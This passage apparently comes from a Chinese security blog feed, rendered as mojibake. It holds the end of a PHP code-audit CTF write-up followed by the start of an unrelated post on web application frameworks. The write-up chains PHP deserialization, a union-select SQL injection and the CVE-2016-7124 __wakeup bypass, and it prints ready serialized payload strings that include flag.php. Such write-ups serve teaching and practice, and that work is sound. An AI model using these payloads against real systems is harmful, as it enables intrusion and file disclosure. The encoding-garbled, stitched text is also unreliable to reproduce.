ä¸­ï¼Œæˆ‘ä»¬å‘ç°SoFunç±»,å¦‚ä¸‹å›¾ï¼Œåœ¨**__destruct()<strong>å‡½æ•°ä¸­ï¼Œä¼šå¯¹ç±»å˜é‡$this-&gt;fileæ‰€å¯¹åº”çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç±»å˜é‡ååºåˆ—åŒ–å¯æ§ï¼Œåœ¨loadDataå‡½æ•°è°ƒç”¨å‰ï¼Œå¯¹IN_FLAGå¸¸é‡è¿›è¡Œäº†è®¾ç½®ï¼Œå¦‚æœloadDataå‡½æ•°ä¼ å…¥å‚æ•°å€¼ä¸ºSoFunç±»ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¸”æ§åˆ¶ç±»å˜é‡<code>$this-&gt;file=flag.php</code>ï¼Œåˆ™å¯ä»¥åŒ…å«flag.phpæ–‡ä»¶ï¼Œæ­¤æ—¶<code>&#39;IN_FLAG&#39;</code>å·²ç»è®¾ç½®ï¼Œå¯è·å–åˆ°flagï¼Œéœ€è€ƒè™‘ç»•è¿‡__wakeup</strong>å‡½æ•°ã€‚</p><p>è€ƒè™‘å¦‚ä½•æ§åˆ¶loadDataå‡½æ•°ä¼ å…¥å‚æ•°çš„å€¼ï¼Œä»ä¸‹å›¾å¯çŸ¥ï¼Œ$obj-&gt;roleæ¥æºäºæ•°æ®åº“æŸ¥è¯¢ç»“æœï¼Œè€Œæ„å»ºsqlè¯­å¥çš„usernameå­—æ®µæ¥æºäº**$username**,$usernameå˜é‡æ¥æºäºfunc_get_args()å‡½æ•°,è¯¥å‡½æ•°è¿”å›åŒ…å«è°ƒç”¨å‡½æ•°å‚æ•°åˆ—è¡¨çš„æ•°ç»„,å¦‚æœlogin()å‡½æ•°ä¼ å…¥å‚æ•°å¯æ§ï¼Œå¯é€šè¿‡unionè”åˆæŸ¥è¯¢ï¼Œæ„é€ æŸ¥è¯¢ç»“æœï¼Œä½¿æ„é€ æ•°æ®ä¸ºSoFunç±»åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å»çœ‹ä¸€ä¸‹loginå‡½æ•°çš„è°ƒç”¨ã€‚<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-21.png"></p><p>åœ¨HINCONç±»**__destructæ–¹æ³•ä¸­ï¼Œé€šè¿‡call_user_func_array()å‡½æ•°è°ƒç”¨loginæˆ–sourceæ–¹æ³•ï¼Œå¦‚æœ$this-&gt;method&#x3D;â€™loginâ€™åˆ™å¯ä»¥è°ƒç”¨login()å‡½æ•°ï¼Œ$this-&gt;methodä¸ºç±»å˜é‡ï¼Œååºåˆ—åŒ–å¯æ§ã€‚$this-&gt;args<strong>ä¸ºè°ƒç”¨å‡½æ•°ä¼ å…¥å‚æ•°ï¼Œæ„å‘³ç€loginå‡½æ•°ä¸­$usernameå˜é‡å¯æ§ï¼Œæ­¤æ—¶å¯é€šè¿‡SQLæ³¨å…¥ï¼Œæ„é€ æŸ¥è¯¢æ•°æ®ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨</strong>__wakeupå¯¹ç±»å˜é‡argsè¿›è¡Œå¤„ç†ï¼Œæ­¤æ—¶è°ƒç”¨mysql_escape_stringå‡½æ•°å¯¹$this-&gt;argsè¿›è¡Œè½¬ä¹‰ã€‚å¯é€šè¿‡CVE-2016-7124<strong>ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡</strong>__wakeup**çš„æ‰§è¡Œã€‚ç»•è¿‡æ£€æµ‹ï¼Œè¿›è¡Œsqlæ³¨å…¥ã€‚<br>æ€»ç»“ä¸€ä¸‹æ€è·¯ï¼š</p><ol><li><p>æ„é€ HITCONç±»ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­**$method&#x3D;â€™loginâ€™,$args**æ•°ç»„â€™usernameâ€™éƒ¨åˆ†å¯ç”¨äºæ„é€ SQLè¯­å¥ï¼Œè¿›è¡ŒSQLæ³¨å…¥ï¼Œâ€™passwordâ€™éƒ¨åˆ†ä»»æ„è®¾ç½®ã€‚</p></li><li><p>è°ƒç”¨login()å‡½æ•°åï¼Œåˆ©ç”¨$usernameæ„é€ è”åˆæŸ¥è¯¢ï¼Œä½¿æŸ¥è¯¢ç»“æœä¸ºSoFunç±»ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè®¾ç½®**$file&#x3D;â€™flag.phpâ€™ï¼Œéœ€ç»•è¿‡__wakeup()**å‡½æ•°ã€‚</p></li><li><p>ç»•è¿‡**LoadData()**å‡½æ•°å¯¹ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„éªŒè¯,å‚è€ƒDay11ã€‚</p></li><li><p>SoFunç±» __destruct()å‡½æ•°è°ƒç”¨å,åŒ…å«flag.phpæ–‡ä»¶ï¼Œè·å–flagï¼Œéœ€ç»•è¿‡__wakeup()å‡½æ•°ã€‚<br>ç¬¬äºŒä¸ªç­”æ¡ˆæ˜¯å¦ä¸€ç§æ€è·¯ï¼Œå¤§å®¶å¯ç ”ç©¶ä¸€ä¸‹ã€‚<br>æ³¨ï¼šå› ä¸ºä¼ å‚æ–¹å¼ä¸ºGETï¼Œæ³¨æ„è¿›è¡ŒURLç¼–ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;HITCON&quot;:3:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;s:8:&quot;username&quot;;s:81:&quot;1&#x27; union select 1,2,&#x27;a:1:&#123;s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;&#125;&#125;</span><br><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:2:&quot;ff&quot;;O:6:&quot;HITCON&quot;:5:&#123;s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:&#123;i:0;s:12:&quot;1&#x27; or &#x27;1&#x27;--+&quot;;i:1;s:3:&quot;111&quot;;&#125;s:4:&quot;conn&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ç¬¬äºŒä¸ªç­”æ¡ˆçš„æ€è·¯ï¼š</p></li><li><p><strong>æ„é€ å¯¹è±¡å’Œæ–¹æ³•è°ƒç”¨</strong>:</p><ul><li>åˆ©ç”¨ <code>HITCON</code> ç±»çš„ <code>__destruct()</code> æ–¹æ³•åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚è¿™ä¸ªæ–¹æ³•ä¼šæ£€æŸ¥ <code>method</code> å±æ€§ä¸­æŒ‡å®šçš„æ–¹æ³•æ˜¯å¦å±äºå…è®¸çš„æ–¹æ³•åˆ—è¡¨ï¼ˆ<code>login</code> æˆ– <code>source</code>ï¼‰ï¼Œç„¶ååŠ¨æ€è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚</li><li>åºåˆ—åŒ–çš„ <code>HITCON</code> å¯¹è±¡ä¸­è®¾ç½® <code>method</code> å±æ€§ä¸º <code>login</code>ï¼Œå¹¶ä¸”é€šè¿‡ <code>args</code> å±æ€§ä¼ å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶ä¸­ç”¨æˆ·åéƒ¨åˆ†è¢«è®¾è®¡ä¸º SQL æ³¨å…¥ä»£ç ã€‚</li></ul></li><li><p><strong>SQL æ³¨å…¥</strong>:</p><ul><li>åœ¨ <code>login()</code> æ–¹æ³•ä¸­ï¼Œæ„é€ çš„ SQL æŸ¥è¯¢å—åˆ° <code>username</code> å­—æ®µçš„å½±å“ï¼Œè¿™é‡Œä½¿ç”¨çš„ <code>sprintf()</code> å‡½æ•°å¯¹ <code>username</code> å’Œ <code>password</code> è¿›è¡Œæ ¼å¼åŒ–å¹¶åµŒå…¥åˆ° SQL è¯­å¥ä¸­ï¼Œå…è®¸æ³¨å…¥æ¶æ„ SQL ä»£ç ã€‚</li><li>ç¤ºä¾‹ä¸­çš„ç”¨æˆ·å <code>&quot;1&#39; union select 1,2,&#39;a:1:&#123;s:2:&quot;xx&quot;;O:5:&quot;SoFun&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#39;--&quot;</code> é€šè¿‡ SQL æ³¨å…¥æ”¹å˜äº†æŸ¥è¯¢ç»“æœï¼Œè®©æŸ¥è¯¢è¿”å›ä¸€ä¸ªæ–°çš„ <code>SoFun</code> ç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</li></ul></li><li><p><strong>ååºåˆ—åŒ–å’Œæ–‡ä»¶åŒ…å«</strong>:</p><ul><li><code>SoFun</code> ç±»åœ¨å…¶ <code>__destruct()</code> æ–¹æ³•ä¸­åŒ…å«ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶ï¼Œé€šè¿‡ä¿®æ”¹ <code>file</code> å±æ€§æŒ‡å‘ <code>flag.php</code>ï¼Œå¯ä»¥åœ¨è„šæœ¬æ‰§è¡Œæœ«å°¾åŒ…å«å¹¶æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</li><li>ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œ<code>SoFun</code> å¯¹è±¡è®¾ç½® <code>file</code> å±æ€§ä¸º <code>&quot;flag.php&quot;</code>ï¼Œåœ¨ <code>__destruct()</code> è¢«è°ƒç”¨æ—¶åŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œå¯¼è‡´æ‰§è¡Œ <code>flag.php</code> ä¸­çš„ä»£ç å¹¶è¾“å‡º flagã€‚</li></ul></li><li><p><strong>ç»•è¿‡__wakeup()å®‰å…¨æªæ–½</strong>:</p><ul><li>åœ¨ <code>SoFun</code> ç±»ä¸­ï¼Œ<code>__wakeup()</code> æ–¹æ³•å°† <code>file</code> å±æ€§é‡ç½®ä¸º <code>&quot;index.php&quot;</code>ï¼Œä¸ºäº†ç»•è¿‡è¿™ä¸ªé‡ç½®ï¼Œæ³¨å…¥çš„ SQL å¿…é¡»åœ¨ <code>SoFun</code> å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åæ‰§è¡Œï¼Œä»¥ç¡®ä¿ <code>file</code> çš„å€¼åœ¨æ‰§è¡Œ <code>__destruct()</code> æ—¶æ˜¯ <code>&quot;flag.php&quot;</code>ã€‚</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘Webåº”ç”¨æ¡†æ¶</title>
      <link href="/2024/10/11/WebSecurity/framwork/webarchitecture/"/>
      <url>/2024/10/11/WebSecurity/framwork/webarchitecture/</url>
      
        <content type="html"><![CDATA[<h2 id="Webåº”ç”¨æ¡†æ¶"><a href="#Webåº”ç”¨æ¡†æ¶" class="headerlink" title="Webåº”ç”¨æ¡†æ¶"></a>Webåº”ç”¨æ¡†æ¶</h2><p>ç™¾åº¦ç™¾ç§‘æ˜¯è¿™ä¹ˆè§£é‡Šçš„ï¼š<br>Webåº”ç”¨æ¡†æ¶ï¼ˆWeb application frameworkï¼‰æ˜¯ä¸€ç§å¼€å‘æ¡†æ¶ï¼Œç”¨æ¥æ”¯æŒåŠ¨æ€ç½‘ç«™ã€ç½‘ç»œåº”ç”¨ç¨‹åºåŠç½‘ç»œæœåŠ¡çš„å¼€å‘ã€‚å…¶ç±»å‹æœ‰åŸºäºè¯·æ±‚çš„å’ŒåŸºäºç»„ä»¶çš„ä¸¤ç§æ¡†æ¶ã€‚<br>webæ¡†æ¶å¯ä»¥åˆ†ä¸ºåŸºäºè¯·æ±‚çš„ï¼ˆrequest-basedï¼‰å’ŒåŸºäºç»„ä»¶çš„ï¼ˆcomponent-basedï¼‰ä¸¤å¤§é˜µè¥ã€‚å‰è€…çš„ä»£è¡¨æœ‰Strutså’ŒSpring MVCç­‰ï¼Œåè€…çš„æˆå‘˜åˆ™æœ‰JSFã€Tapestryç­‰ç­‰ã€‚</p><ol><li>åŸºäºè¯·æ±‚çš„æ¡†æ¶è¾ƒæ—©å‡ºç°ï¼Œå®ƒç”¨ä»¥æè¿°ä¸€ä¸ªwebåº”ç”¨ç¨‹åºç»“æ„çš„æ¦‚å¿µå’Œä¼ ç»Ÿçš„é™æ€Internetç«™ç‚¹ä¸€æ ·ï¼Œæ˜¯å°†å…¶æœºåˆ¶æ‰©å±•åˆ°åŠ¨æ€å†…å®¹çš„å»¶ä¼¸ã€‚å¯¹ä¸€ä¸ªæä¾›HTMLå’Œå›¾ç‰‡ç­‰é™æ€å†…å®¹çš„ç½‘ç«™ï¼Œç½‘ç»œå¦ä¸€ç«¯çš„æµè§ˆå™¨å‘å‡ºä»¥URIå½¢å¼æŒ‡å®šçš„èµ„æºçš„è¯·æ±‚ï¼ŒWebæœåŠ¡å™¨è§£è¯»è¯·æ±‚ï¼Œæ£€æŸ¥è¯¥èµ„æºæ˜¯å¦å­˜åœ¨äºæœ¬åœ°ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›è¯¥é™æ€å†…å®¹ï¼Œå¦åˆ™é€šçŸ¥æµè§ˆå™¨æ²¡æœ‰æ‰¾åˆ°ã€‚Webåº”ç”¨å‡çº§åˆ°åŠ¨æ€å†…å®¹é¢†åŸŸåï¼Œè¿™ä¸ªæ¨¡å‹åªéœ€è¦åšä¸€ç‚¹ä¿®æ”¹ã€‚é‚£å°±æ˜¯webæœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªURLè¯·æ±‚ï¼ˆç›¸è¾ƒäºé™æ€æƒ…å†µä¸‹çš„èµ„æºï¼ŒåŠ¨æ€æƒ…å†µä¸‹æ›´æ¥è¿‘äºå¯¹ä¸€ç§æœåŠ¡çš„è¯·æ±‚å’Œè°ƒç”¨ï¼‰åï¼Œåˆ¤æ–­è¯¥è¯·æ±‚çš„ç±»å‹ï¼Œå¦‚æœæ˜¯é™æ€èµ„æºï¼Œåˆ™ç…§ä¸Šé¢æ‰€è¿°å¤„ç†ï¼›å¦‚æœæ˜¯åŠ¨æ€å†…å®¹ï¼Œåˆ™é€šè¿‡æŸç§æœºåˆ¶ï¼ˆCGIã€è°ƒç”¨å¸¸é©»å†…å­˜çš„æ¨¡å—ã€é€’é€ç»™å¦ä¸€ä¸ªè¿›ç¨‹å¦‚Javaå®¹å™¨ï¼‰è¿è¡Œè¯¥åŠ¨æ€å†…å®¹å¯¹åº”çš„ç¨‹åºï¼Œæœ€åç”±ç¨‹åºç»™å‡ºå“åº”ï¼Œè¿”å›æµè§ˆå™¨ã€‚åœ¨è¿™æ ·ä¸€ä¸ªç›´æ¥ä¸webåº•å±‚æœºåˆ¶äº¤æµçš„æ¨¡å‹ä¸­ï¼ŒæœåŠ¡å™¨ç«¯ç¨‹åºè¦æ”¶é›†å®¢æˆ·ç«¯ç±getæˆ–postæ–¹å¼æäº¤çš„æ•°æ®ï¼Œè½¬æ¢ï¼Œæ ¡éªŒï¼Œç„¶åä»¥è¿™äº›æ•°æ®ä½œä¸ºè¾“å…¥è¿è¡Œä¸šåŠ¡é€»è¾‘åç”ŸæˆåŠ¨æ€çš„å†…å®¹ï¼ˆåŒ…æ‹¬HTMLã€JavaScriptã€CSSã€å›¾ç‰‡ç­‰ï¼‰ã€‚</li><li>åŸºäºç»„ä»¶çš„æ¡†æ¶é‡‡å–äº†å¦ä¸€ç§æ€è·¯ï¼Œå®ƒæŠŠé•¿ä¹…ä»¥æ¥è½¯ä»¶å¼€å‘åº”ç”¨çš„ç»„ä»¶æ€æƒ³å¼•å…¥åˆ°webå¼€å‘ã€‚æœåŠ¡å™¨è¿”å›çš„åŸæœ¬æ–‡æ¡£å½¢å¼çš„ç½‘é¡µè¢«è§†ä¸ºç”±ä¸€ä¸ªä¸ªå¯ç‹¬ç«‹å·¥ä½œã€é‡å¤ä½¿ç”¨çš„ç»„ä»¶æ„æˆã€‚æ¯ä¸ªç»„ä»¶éƒ½èƒ½æ¥å—ç”¨æˆ·çš„è¾“å…¥ï¼Œè´Ÿè´£è‡ªå·±çš„æ˜¾ç¤ºã€‚ä¸Šé¢æåˆ°çš„æœåŠ¡å™¨ç«¯ç¨‹åºæ‰€åšçš„æ•°æ®æ”¶é›†ã€è½¬æ¢ã€æ ¡éªŒçš„å·¥ä½œéƒ½è¢«ä¸‹æ”¾ç»™å„ä¸ªç»„ä»¶ã€‚ç°ä»£webæ¡†æ¶åŸºæœ¬ä¸Šéƒ½é‡‡ç”¨äº†æ¨¡å‹ã€è§†å›¾ã€æ§åˆ¶å™¨ç›¸åˆ†ç¦»çš„MVCæ¶æ„ï¼ŒåŸºäºè¯·æ±‚å’ŒåŸºäºç»„ä»¶ä¸¤ç§ç±»å‹å¤§éƒ½ä¼šæœ‰ä¸€ä¸ªæ§åˆ¶å™¨å°†ç”¨æˆ·çš„è¯·æ±‚åˆ†æ´¾ç»™è´Ÿè´£ä¸šåŠ¡é€»è¾‘çš„æ¨¡å‹ï¼Œè¿ç®—çš„ç»“æœå†ä»¥æŸä¸ªè§†å›¾è¡¨ç°å‡ºæ¥ï¼Œæ‰€ä»¥ä¸¤å¤§åˆ†ç±»æ¡†æ¶çš„åŒºåˆ«ä¸»è¦åœ¨è§†å›¾éƒ¨åˆ†ï¼ŒåŸºäºè¯·æ±‚çš„æ¡†æ¶ä»ç„¶æŠŠè§†å›¾ä¹Ÿå°±æ˜¯ç½‘é¡µçœ‹ä½œæ˜¯ä¸€ä¸ªæ–‡æ¡£æ•´ä½“ï¼Œç¨‹åºå‘˜è¦ç”¨HTMLã€Javascriptå’ŒCSSè¿™äº›åº•å±‚çš„ä»£ç æ¥å†™â€œæ–‡æ¡£â€ï¼Œè€ŒåŸºäºç»„ä»¶çš„æ¡†æ¶åˆ™æŠŠè§†å›¾çœ‹ä½œç”±ç§¯æœ¨ä¸€æ ·çš„æ„ä»¶æ‹¼æˆï¼Œç§¯æœ¨çš„æ˜¾ç¤ºä¸ç”¨ç¨‹åºå‘˜æ“å¿ƒï¼ˆå½“ç„¶å®ƒä»¬ä¹Ÿæ˜¯ç”±å¦ä¸€äº›ç¨‹åºå‘˜å¼€å‘å‡ºæ¥çš„ï¼‰ï¼Œåªè¦è®¾ç½®å¥½å®ƒç»‘å®šçš„æ•°æ®å’Œè°ƒæ•´å®ƒçš„å±æ€§ï¼ŒæŠŠä»–ä»¬å¤§å¤§ä»ç¼–å†™HTMLã€Javascriptå’ŒCSSè¿™äº›ç•Œé¢çš„å·¥ä½œä¸­è§£æ”¾å‡ºæ¥ã€‚</li></ol><p>ä¸Šé¢æ˜¯ç™¾åº¦ç™¾ç§‘çš„å›ç­”ï¼Œä¸‹é¢æˆ‘åˆæ‰¾åˆ°äº†çŸ¥ä¹ä¸€ç¯‡æ–‡ç« çš„æè¿°ï¼š</p><ol><li>åŸºäºâ€œç»„ä»¶â€ï¼ˆComponent ï¼ŒGUIè®¾è®¡ä¹Ÿå¸¸ç§°æ§ä»¶ï¼‰ã€äº‹ä»¶é©±åŠ¨çš„æ¶æ„ï¼Œæœ€å¸¸è§çš„æ˜¯å¾®è½¯çš„.NETã€‚åŸºæœ¬æ€æƒ³æ˜¯æŠŠç¨‹åºåˆ†æˆå¾ˆå¤šç»„ä»¶ï¼Œæ¯ä¸ªç»„ä»¶éƒ½å¯ä»¥è§¦å‘äº‹ä»¶ï¼Œè°ƒç”¨ç‰¹å®šçš„äº‹ä»¶å¤„ç†å™¨æ¥å¤„ç†ï¼ˆæ¯”å¦‚åœ¨ä¸€ä¸ªHTMLæŒ‰é’®ä¸Šè®¾ç½®onClickäº‹ä»¶é“¾æ¥åˆ°ä¸€ä¸ªPHPå‡½æ•°ï¼‰ã€‚è¿™ç§è®¾è®¡è¿œç¦»HTTPï¼ŒHTTPè¯·æ±‚å®Œå…¨æŠ½è±¡ï¼Œæ˜ å°„åˆ°ä¸€ä¸ªäº‹ä»¶ã€‚äº‹å®ä¸Šè¿™ç§è®¾è®¡åŸæœ¬æœ€å¸¸åº”ç”¨äºä¼ ç»Ÿæ¡Œé¢GUIç¨‹åºçš„å¼€å‘ï¼Œä¾‹å¦‚Delphiï¼ŒJava Swingç­‰ã€‚æ‰€æœ‰è¡¨ç°å±‚çš„ç»„ä»¶æ¯”å¦‚çª—å£ï¼Œæˆ–è€…HTMLè¡¨å•éƒ½å¯ä»¥ç”±IDEæ¥æä¾›ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨IDEé‡Œç‚¹å‡»æˆ–æ‹–åŠ¨é¼ æ ‡å°±èƒ½å¤Ÿè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªç»„ä»¶ï¼Œå¹¶ä¸”æ·»åŠ ä¸€ä¸ªç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚</li><li>åŸºäºâ€œWEBé¡µé¢&#x2F;æ–‡ä»¶â€ï¼Œä¾‹å¦‚CGIå’ŒPHP&#x2F;ASPç¨‹åºã€‚ç¨‹åºçš„æ–‡ä»¶åˆ†åˆ«å­˜å‚¨åœ¨ä¸åŒçš„ç›®å½•é‡Œï¼Œä¸URLç›¸å¯¹åº”ã€‚å½“HTTPè¯·æ±‚æäº¤è‡³æœåŠ¡å™¨æ—¶ï¼ŒURLç›´æ¥æŒ‡å‘æŸä¸ªæ–‡ä»¶ï¼Œç„¶åç”±è¯¥æ–‡ä»¶æ¥å¤„ç†è¯·æ±‚ï¼Œå¹¶è¿”å›å“åº”ç»“æœã€‚æ¯”å¦‚<a href="http://www.website.conm/news/readnews.php?id=1234%E5%8F%AF%E4%BB%A5%E6%83%B3%E5%83%8F%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E7%AB%99%E7%82%B9%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%9A%84news%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%94%BE%E7%BD%AE%E4%B8%80%E4%B8%AAreadnews.php%E6%96%87%E4%BB%B6%E3%80%82%E8%BF%99%E7%A7%8D%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F%E6%9C%80%E8%87%AA%E7%84%B6%EF%BC%8C%E6%9C%80%E6%98%93%E7%90%86%E8%A7%A3%EF%BC%8C%E4%B9%9F%E6%98%AFPHP%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E5%BC%8F%E3%80%82%E8%A6%81%E6%B3%A8%E6%84%8F%E4%BA%A7%E7%94%9F%E7%9A%84URL%E5%AF%B9%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B8%8D%E5%8F%8B%E5%A5%BD%EF%BC%8C%E4%B8%8D%E8%BF%87%E4%BD%A0%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%90%E4%BE%9B%E7%9A%84URL%E9%87%8D%E5%86%99%E6%96%B9%E6%A1%88%E6%9D%A5%E5%A4%84%E7%90%86%EF%BC%8C%E4%BE%8B%E5%A6%82Apache%E7%9A%84mod_rewrite%E3%80%82">http://www.website.conm/news/readnews.php?id=1234å¯ä»¥æƒ³åƒï¼Œæˆ‘ä»¬åœ¨ç«™ç‚¹æ ¹ç›®å½•çš„newsç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ªreadnews.phpæ–‡ä»¶ã€‚è¿™ç§å¼€å‘æ–¹å¼æœ€è‡ªç„¶ï¼Œæœ€æ˜“ç†è§£ï¼Œä¹Ÿæ˜¯PHPæœ€å¸¸ç”¨çš„æ–¹å¼ã€‚è¦æ³¨æ„äº§ç”Ÿçš„URLå¯¹æœç´¢å¼•æ“ä¸å‹å¥½ï¼Œä¸è¿‡ä½ å¯ä»¥ç”¨æœåŠ¡å™¨æä¾›çš„URLé‡å†™æ–¹æ¡ˆæ¥å¤„ç†ï¼Œä¾‹å¦‚Apacheçš„mod_rewriteã€‚</a></li><li>åŸºäºâ€œåŠ¨ä½œâ€(Action)ã€‚è¿™æ˜¯MVCæ¶æ„çš„WEBç¨‹åºæ‰€é‡‡ç”¨çš„æœ€å¸¸è§çš„æ–¹å¼ã€‚ç›®å‰ä¸»æµçš„WEBæ¡†æ¶åƒStrutsã€Webwork(Java)ï¼ŒRuby on Rails(Ruby),Zend Framework(PHP)ç­‰éƒ½é‡‡ç”¨è¿™ç§è®¾è®¡ã€‚URLæ˜ å°„åˆ°æ§åˆ¶å™¨(controller)å’Œæ§åˆ¶å™¨ä¸­çš„åŠ¨ä½œ(action)ï¼Œç”±actionæ¥å¤„ç†è¯·æ±‚å¹¶è¾“å‡ºå“åº”ç»“æœã€‚è¿™ç§è®¾è®¡å’Œä¸Šé¢çš„åŸºäºæ–‡ä»¶çš„æ–¹å¼ä¸€æ ·ï¼Œéƒ½æ˜¯è¯·æ±‚&#x2F;å“åº”é©±åŠ¨çš„æ–¹æ¡ˆï¼Œç¦»ä¸å¼€HTTPã€‚æ¯”å¦‚ <a href="http://www.website.com/news/read/id/1234">http://www.website.com/news/read/id/1234</a> å¯ä»¥æƒ³åƒåœ¨å®é™…ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä¼šæœ‰ä¸€ä¸ªæ§åˆ¶å™¨newsControllerï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªreadActionã€‚ä¸åŒæ¡†æ¶å¯èƒ½é»˜è®¤å®ç°æ–¹å¼ç¨æœ‰ä¸åŒï¼Œæœ‰çš„æ˜¯ä¸€ä¸ªControllerä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰å¤šä¸ªActionï¼Œæœ‰çš„æ˜¯æ¯ä¸ªActionä¸€ä¸ªæ–‡ä»¶ã€‚è¿™ç§æ–¹å¼çš„URLé€šå¸¸éƒ½å¾ˆæ¼‚äº®ï¼Œå¯¹æœç´¢å¼•æ“å‹å¥½ï¼Œå› ä¸ºå¾ˆå¤šæ¡†æ¶éƒ½è‡ªå¸¦æœ‰URLé‡å†™åŠŸèƒ½ã€‚å¯ä»¥è‡ªç”±è§„å®šURLä¸­controllerã€actionåŠå‚æ•°å‡ºç°çš„ä½ç½®ã€‚</li></ol><p>å¦å¤–ï¼Œè¿˜æœ‰æ›´ç›´æ¥çš„åŸºäºURLçš„è®¾è®¡æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯RESTã€‚é€šè¿‡äººä¸ºè§„å®šURLçš„æ„æˆå½¢å¼ï¼ˆæ¯”å¦‚Actioné™åˆ¶æˆåªæœ‰å‡ ç§ï¼‰æ¥ä¿ƒè¿›ç½‘ç«™ä¹‹é—´çš„äº’ç›¸è®¿é—®ï¼Œé™ä½å¼€å‘çš„å¤æ‚æ€§ï¼Œæé«˜ç³»ç»Ÿçš„å¯ä¼¸ç¼©æ€§ã€‚RESTå¯¹äºWeb Servicesæ¥è¯´æ˜¯ä¸€ä¸ªåˆ›æ–°ã€‚è™½ç„¶æœ¬æ–‡è®¨è®ºçš„æ˜¯å•ä¸ªé¡¹ç›®æ‰€é‡‡ç”¨çš„æ¶æ„ï¼Œè€ŒRESTæ˜¯ä¸ºäº†è§£å†³ç½‘ç«™ä¹‹é—´çš„é€šè®¯é—®é¢˜ï¼Œä½†RESTçš„å‡ºç°ï¼Œä¼šå¯¹å•ä¸ªé¡¹ç›®çš„æ¶æ„é€ æˆå½±å“ï¼ˆå¾ˆæ˜¾ç„¶ä½ åœ¨å¼€å‘æ—¶å°±è¦æ„é€ è§„èŒƒçš„URLï¼‰ã€‚å°†æ¥æ··ç”¨RESTå’ŒMVCåº”è¯¥ä¹Ÿæ˜¯ä¸€ç§è¶‹åŠ¿ã€‚RoRæä¾›å¾ˆå¥½çš„RESTæ”¯æŒï¼ŒZend Frameworkä¹Ÿæä¾›äº†Zend_Restæ¥æ”¯æŒRESTï¼ŒåŒ…æ‹¬Serverå’ŒClientã€‚</p><p>é™¤äº†ä¸Šé¢ä¹‹å¤–ï¼Œæˆ‘è¿˜æ€»ç»“æœ‰ä»¥ä¸‹å†…å®¹ï¼š<br>4. å¾®æœåŠ¡æ¶æ„ (Microservices Architecture) 